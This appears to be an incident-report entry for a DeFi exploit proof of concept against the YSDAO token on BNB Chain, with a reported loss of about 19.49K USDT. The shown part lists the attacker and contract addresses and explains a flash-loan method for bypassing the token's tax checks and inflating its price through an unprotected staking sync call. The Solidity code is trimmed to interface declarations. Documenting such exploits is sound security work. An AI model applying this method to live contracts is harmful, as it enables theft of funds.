# [?] YSDAO - Price Manipulation and Tax Bypass

## Summary
Severity: Unknown
Chain: BNB Chain
Component: YSDAO
Published: 2026-05-29
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-05/YSDAO_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~19.49K USDT

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

// @KeyInfo - Total Lost : ~19.49K USDT
// Attacker : https://bscscan.com/address/0x8114650Cfd2617CD05C59898De7C620ae413b460
// Attack Contract : https://bscscan.com/address/0xafBf780569B95C5766F78b9CC5788899Aa5616Af
// Vulnerable Token : https://bscscan.com/address/0xc036A13D7A6A84677DfCcec483eED124654B7918
// Vulnerable Staking : https://bscscan.com/address/0x3E13019dA3BAAd134493e751704D2D4245Eec7CA
// Attack Tx : https://bscscan.com/tx/0x91f26d96373bbec6a6a8517c7be995a739d65f20fed589d53bc47d8140f91907
//
// @Analysis
// YSDAO's transfer protection detects add/remove liquidity by reading the Pancake V2
// pair's current token balances against reserves. The attacker combines a V3 USDT
// flash loan with a V2 pair callback:
//   1. Buy YSDAO while making the pair output 1 wei USDT, so _isRemoveLiquidity()
//      sees pair USDT balance below reserve and skips buy tax/cooldown accounting.
//   2. Call Staking.sync(). It has no access control and transfers all staking-held
//      USDT into the YSDAO/USDT pair, then pair.sync(), raising the apparent YSDAO price.
//   3. Transfer 1 USDT into the pair before selling, so _isAddLiquidity() treats the
//      sale as liquidity addition and bypasses the harsher sell/profit-tax path.

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IPancakeV2PairMinimal {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IPancakeV2RouterMinimal {
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-05/YSDAO_exp.sol_
